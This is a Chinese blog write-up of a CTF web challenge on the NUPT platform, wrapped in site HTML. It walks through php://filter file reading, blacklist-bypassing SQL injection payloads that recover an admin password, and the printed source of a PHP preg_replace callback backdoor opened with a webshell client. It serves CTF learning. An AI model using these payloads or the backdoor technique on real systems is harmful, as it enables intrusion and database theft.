@@ -1,0 +1,1205 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next gemini" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="闲言语" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="通过SQL注入得到后台登陆密码，连接管理员自用的回调后门。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="南邮CTF平台综合题2writeup">
+<meta property="og:url" content="https://findneo.github.io/171004NuptZonghe2WP/index.html">
+<meta property="og:site_name" content="闲言语">
+<meta property="og:description" content="通过SQL注入得到后台登陆密码，连接管理员自用的回调后门。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://findneo.github.io/171004NuptZonghe2WP/cmsnupt.png">
+<meta property="og:image" content="https://findneo.github.io/171004NuptZonghe2WP/arlogined.png">
+<meta property="og:updated_time" content="2019-01-25T23:21:36.854Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="南邮CTF平台综合题2writeup">
+<meta name="twitter:description" content="通过SQL注入得到后台登陆密码，连接管理员自用的回调后门。">
+<meta name="twitter:image" content="https://findneo.github.io/171004NuptZonghe2WP/cmsnupt.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":false,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://findneo.github.io/171004NuptZonghe2WP/">
+
+
+
+
+
+  <title>南邮CTF平台综合题2writeup | 闲言语</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?c9a19ce963f4d3d9bdc923fec3582400";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">闲言语</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://findneo.github.io/171004NuptZonghe2WP/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="findneo">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="闲言语">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">南邮CTF平台综合题2writeup</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-10-04T21:04:34+08:00">
+                2017-10-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+              <div class="post-description">
+                  通过SQL注入得到后台登陆密码，连接管理员自用的回调后门。
+              </div>
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<p>非xss题 但是欢迎留言~<br>地址：<a href="http://cms.nuptzj.cn/" target="_blank" rel="noopener">get the flag</a></p>
+</blockquote>
+<h2 id="读取源码"><a href="#读取源码" class="headerlink" title="读取源码"></a>读取源码</h2><p>在页面底部发现一个这样的链接：<em><a href="http://cms.nuptzj.cn/about.php?file=sm.txt" target="_blank" rel="noopener">http://cms.nuptzj.cn/about.php?file=sm.txt</a></em> ，说明题目提供了读取文件功能，如果使用 <em><a href="http://php.net/manual/en/wrappers.file.php" target="_blank" rel="noopener">file://协议</a></em> 读取，HTML预留字符会以字符实体显示，看起来不方便，所以也可以编码读取后再本地解码。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//cms.nuptzj.cn/about.php?file=php://filter/convert.base64-encode/resource=filename</span></span><br><span class="line">在拿到的文件里搜索 <span class="string">".php"</span> ，顺藤摸瓜，能找到并读取到的文件有：</span><br><span class="line">  sm.txt</span><br><span class="line">  about.php</span><br><span class="line">  index.php</span><br><span class="line">  passencode.php</span><br><span class="line">  say.php</span><br><span class="line">  antixss.php</span><br><span class="line">  so.php</span><br><span class="line">  preview.php</span><br><span class="line">  antiinject.php</span><br><span class="line">  -----------------------------</span><br><span class="line">  知道有 loginxlcteam目录或文件 和 config.php 但还读不到 ；还不知道有<span class="keyword">list</span>.php ,xlcteam.php</span><br></pre></td></tr></table></figure>
+<h3 id="关于file-协议"><a href="#关于file-协议" class="headerlink" title="关于file://协议"></a>关于<em>file://协议</em></h3><p> <em>file://协议</em> (<a href="https://tools.ietf.org/html/rfc8089" target="_blank" rel="noopener">RFC8089</a> )是用来访问本地文件系统的，因为文件系统 是 PHP 使用的默认封装协议，因此在fopen()、 copy()、 file_exists() 、 file_get_contents()和 filesize() 等文件系统函数中是支持的。</p>
+<p>在谷歌/火狐浏览器的URL框里输入  <em>file:///D:/</em>  或者在Linux命令行里敲 <em>lynx file:///</em> 都可以看到效果。</p>
+<p><a href="http://php.net/manual/en/wrappers.file.php#refsect1-wrappers.file-usage" target="_blank" rel="noopener">PHP文档</a> 提供的用法如下：</p>
+<blockquote>
+<ul>
+<li>/path/to/file.ext</li>
+<li>relative/path/to/file.ext</li>
+<li>fileInCwd.ext</li>
+<li>C:/path/to/winfile.ext</li>
+<li>C:\path\to\winfile.ext</li>
+<li>\smbserver\share\path\to\winfile.ext</li>
+<li>file:///path/to/file.ext</li>
+</ul>
+</blockquote>
+<h3 id="关于PHP的过滤器-php-filter"><a href="#关于PHP的过滤器-php-filter" class="headerlink" title="关于PHP的过滤器(php://filter)"></a>关于PHP的过滤器(<em>php://filter</em>)</h3><p> <a href="http://php.net/manual/en/wrappers.php.php#wrappers.php.filter" target="_blank" rel="noopener">php://filter</a> 和 <a href="http://php.net/manual/en/filters.php" target="_blank" rel="noopener">可用的过滤器列表</a>。主要用在数据流内容读取之前做些筛选过滤，可指定过滤器应用在读模式还是写模式，不指定则两者都应用，也可复合使用多个过滤器，使用管道符隔开即可。</p>
+<p>对于CTFer典型的用法像是这样：</p>
+<blockquote>
+<p>php://filter/read= &lt; filter list to apply to read chain &gt;/resource= &lt; stream to be filtered &gt;</p>
+<p>php://filter/read=string.toupper|string.rot13/resource=<a href="https://findneo.github.io/">https://findneo.github.io/</a></p>
+<p>php://filter/convert.base64-encode/resource=filename</p>
+</blockquote>
+<p>常用过滤器列表：</p>
+<ul>
+<li>String Filters<ul>
+<li>string.rot13</li>
+<li>string.toupper</li>
+<li>string.tolower</li>
+<li>string.strip_tags</li>
+</ul>
+</li>
+<li>Conversion Filters<ul>
+<li>convert.base64-encode &amp; convert.base64-decode</li>
+<li>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</li>
+</ul>
+</li>
+<li>Compression Filters</li>
+<li>Encryption Filters</li>
+</ul>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>全局搜索 <em>mysql_query</em> ，发现 <em>say.php,so.php,index.php</em> 都存在数据库操作。选择 <em>so.php</em> 下手。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*so.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]!=<span class="string">"Xlcteam Browser"</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'万恶滴黑阔，本功能只有用本公司开发的浏览器才可以用喔~'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_POST[<span class="string">'soid'</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antiinject.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'antixss.php'</span>;</span><br><span class="line">$id=antiinject($id);</span><br><span class="line">$con = mysql_connect($db_address,$db_user,$db_pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"不能连接到数据库！！"</span>.mysql_error());</span><br><span class="line">mysql_select_db($db_name,$con);</span><br><span class="line">$id=mysql_real_escape_string($id);</span><br><span class="line">$result=mysql_query(<span class="string">"SELECT * FROM `message` WHERE display=1 AND id=$id"</span>);</span><br><span class="line">$rs=mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars($rs[<span class="string">'nice'</span>]).<span class="string">':&lt;br /&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;'</span>.antixss($rs[<span class="string">'say'</span>]).<span class="string">'&lt;br /&gt;'</span>;</span><br><span class="line">mysql_free_result($result);</span><br><span class="line">mysql_free_result($file);</span><br><span class="line">mysql_close($con);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line"><span class="comment">/*antiinject.php*/</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">antiinject</span><span class="params">($content)</span></span>&#123;</span><br><span class="line">$keyword=<span class="keyword">array</span>(<span class="string">"select"</span>,<span class="string">"union"</span>,<span class="string">"and"</span>,<span class="string">"from"</span>,<span class="string">' '</span>,<span class="string">"'"</span>,<span class="string">";"</span>,<span class="string">'"'</span>,<span class="string">"char"</span>,<span class="string">"or"</span>,<span class="string">"count"</span>,<span class="string">"master"</span>,<span class="string">"name"</span>,<span class="string">"pass"</span>,<span class="string">"admin"</span>,<span class="string">"+"</span>,<span class="string">"-"</span>,<span class="string">"order"</span>,<span class="string">"="</span>);</span><br><span class="line">$info=strtolower($content);</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=count($keyword);$i++)&#123;</span><br><span class="line"> $info=str_replace($keyword[$i], <span class="string">''</span>,$info);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $info;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p> 关注 3、11、14、15行。</p>
+<ol>
+<li><p>burp抓包，修改 <em>User-Agent</em> 字段即可。</p>
+</li>
+<li><p><em>antiinject()</em> 过滤规则是按黑名单<strong><em>依次</em></strong>把关键字删除。</p>
+<ol>
+<li>用黑名单里最后一个关键字 <code>=</code> 分隔即可绕过对多字符关键字的过滤。</li>
+<li>用 <code>/**/</code> 代替空格符。</li>
+<li>单字符关键字不太会弄，也许可以用各种编码绕过，不过我们暂时未必需要，有空格和这些多字符关键字，再加上不在黑名单里的 <code>&lt;&gt;/()</code> 已经可以开始搞事了。</li>
+</ol>
+</li>
+<li><p><em>mysql_real_escape_string()</em> 的功能是对<code>\x00, \n, \r, \, &#39;, &quot; , \x1a(撤销键,ctrl+z)</code> 加反斜杠转义，我们不用这些字符就是了。</p>
+</li>
+<li><p>15行处将处理过的参数直接拼接到查询语句，因为查询结果有多列，又没有逗号可用，不好用内联注入，于是尝试基于逻辑的注入。数据库结构在 <em>sm.txt</em> 已经给出。</p>
+</li>
+<li><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">我们想要在数据库执行的查询语句是这样：</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`message`</span> <span class="keyword">WHERE</span> display=<span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span> userpass <span class="keyword">from</span> <span class="keyword">admin</span>)<span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>))&gt;<span class="number">65</span></span><br><span class="line"></span><br><span class="line">因为没法用空格，所以实际上是这样：</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="string">`message`</span> <span class="keyword">WHERE</span> display=<span class="number">1</span> <span class="keyword">AND</span> <span class="keyword">id</span>=   <span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span><span class="comment">/**/</span>userpass<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)<span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></span><br><span class="line"></span><br><span class="line">希望经过过滤的 <span class="keyword">id</span> 值为：</span><br><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">and</span><span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((<span class="keyword">select</span><span class="comment">/**/</span>userpass<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span><span class="keyword">admin</span>)<span class="keyword">from</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">for</span><span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></span><br><span class="line"></span><br><span class="line">向 so.php post过去的参数应该是：</span><br><span class="line">soid=<span class="number">1</span><span class="comment">/**/</span>an=d<span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((selec=t<span class="comment">/**/</span>userpas=s<span class="comment">/**/</span>fro=m<span class="comment">/**/</span>admi=n)fro=m<span class="comment">/**/</span><span class="number">1</span><span class="comment">/**/</span>fo=r<span class="comment">/**/</span><span class="number">1</span>))&gt;<span class="number">65</span></span><br><span class="line"></span><br><span class="line">使用burp爆破</span><br><span class="line">soid=<span class="number">1</span><span class="comment">/**/</span>an=d<span class="comment">/**/</span><span class="keyword">ascii</span>(<span class="keyword">mid</span>((selec=t<span class="comment">/**/</span>userpas=s<span class="comment">/**/</span>fro=m<span class="comment">/**/</span>admi=n)fro=m<span class="comment">/**/</span>§<span class="number">1</span>§<span class="comment">/**/</span>fo=r<span class="comment">/**/</span><span class="number">1</span>))&gt;§<span class="number">65</span>§</span><br><span class="line">使用 Cluster Bomb 模式，第一个payload 为 [<span class="number">1</span><span class="number">-40</span>] ，第二个为 [<span class="number">31</span>,<span class="number">32</span>,<span class="number">47</span><span class="number">-57</span>](经过几次尝试发现usepass字段只有[ \d] )</span><br><span class="line">得到[<span class="number">49</span>,<span class="number">48</span>,<span class="number">50</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">57</span>,<span class="number">57</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">52</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">54</span>,<span class="number">32</span>,<span class="number">49</span>,<span class="number">49</span>,<span class="number">55</span>]</span><br><span class="line">也就是[<span class="number">102</span> ,<span class="number">117</span> ,<span class="number">99</span> ,<span class="number">107</span> ,<span class="number">114</span> ,<span class="number">117</span> ,<span class="number">110</span> ,<span class="number">116</span> ,<span class="number">117</span>]即funckruntu，访问loginxlcteam登陆即可</span><br><span class="line"></span><br><span class="line">进后台得知有管理员留的后门 xlcteam.php ，于是读一下这个文件</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="意外"><a href="#意外" class="headerlink" title="意外"></a>意外</h2><p>看别人的writeup时惊喜的发现原来并没有过滤逗号，这意味着可以一次注出来管理员密码！所以深夜里我是有些激动的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">soid=1/**/an=d/**/0/**/unio=n/**/selec=t/**/null,usernam=e,userpas=s,null/**/fro=m/**/admi=n</span><br><span class="line"></span><br><span class="line">//当然，在充分掌握数据库结构前需要一些尝试。</span><br></pre></td></tr></table></figure>
+<h2 id="使用回调后门"><a href="#使用回调后门" class="headerlink" title="使用回调后门"></a>使用回调后门</h2><p>回调后门似乎是 phithon 师傅最先这样称呼的，在 <a href="https://www.leavesongs.com/PENETRATION/php-callback-backdoor.html" target="_blank" rel="noopener"><em>创造tips的秘籍——PHP回调后门</em> </a>里做了具体介绍。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//xlcteam.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$e = $_REQUEST[<span class="string">'www'</span>];</span><br><span class="line">$arr = <span class="keyword">array</span>($_POST[<span class="string">'wtf'</span>] =&gt; <span class="string">'|.*|e'</span>,);</span><br><span class="line">array_walk($arr, $e, <span class="string">''</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  <span class="comment">//使用菜刀连接即可。</span></span><br><span class="line">  <span class="comment">//url : http://cms.nuptzj.cn/xlcteam.php?www=preg_replace</span></span><br><span class="line">  <span class="comment">//密码:	wtf</span></span><br></pre></td></tr></table></figure>
+<p>菜刀连上后拿到所有文件，发现 config.php 里有数据库配置，于是就可以操作整个数据库了。</p>
+<p>是的，中午吃的是美味的黄焖鸡 \o/</p>
+<p><img src="cmsnupt.png" alt=""></p>
+<p><img src="arlogined.png" alt=""></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/171003CmdSurfnet/" rel="next" title="命令行拨号上网">
+                <i class="fa fa-chevron-left"></i> 命令行拨号上网
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/171005NuptVigenereWP/" rel="prev" title="南邮CTF平台 Vigenere writeup">
+                南邮CTF平台 Vigenere writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">findneo</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">73</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/findneo" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="javascript:alert(atob('ZGZpbmRuZW9AZ21haWwuY29t'))" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i></a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://twitter.com/findne0" target="_blank" title="Twitter">
+                      
+                        <i class="fa fa-fw fa-twitter"></i></a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://chybeta.github.io/" title="Chybeta" target="_blank">Chybeta</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ctftime.org/event/list/upcoming" title="CTFtime" target="_blank">CTFtime</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ginove.github.io/" title="Ginove" target="_blank">Ginove</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://lm0963.github.io/" title="Lm0963" target="_blank">Lm0963</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.lzhtony.com" title="lzhtony" target="_blank">lzhtony</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://madsome.one/" title="Mads" target="_blank">Mads</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ph0en1x.com/" title="Ph0en1x-Team" target="_blank">Ph0en1x-Team</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://vancir.com/" title="Vancir" target="_blank">Vancir</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#读取源码"><span class="nav-number">1.</span> <span class="nav-text">读取源码</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#关于file-协议"><span class="nav-number">1.1.</span> <span class="nav-text">关于file://协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于PHP的过滤器-php-filter"><span class="nav-number">1.2.</span> <span class="nav-text">关于PHP的过滤器(php://filter)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#注入"><span class="nav-number">2.</span> <span class="nav-text">注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#意外"><span class="nav-number">3.</span> <span class="nav-text">意外</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#使用回调后门"><span class="nav-number">4.</span> <span class="nav-text">使用回调后门</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">findneo</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
